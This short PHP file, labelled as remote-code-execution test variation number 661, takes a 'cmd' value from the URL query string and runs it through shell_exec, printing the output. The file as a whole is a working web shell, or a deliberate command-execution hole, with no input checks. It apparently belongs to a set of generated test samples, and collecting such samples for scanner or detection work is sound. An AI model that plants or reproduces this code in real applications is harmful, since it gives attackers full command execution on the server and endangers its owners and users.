<?php
// RCE test variation #661
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>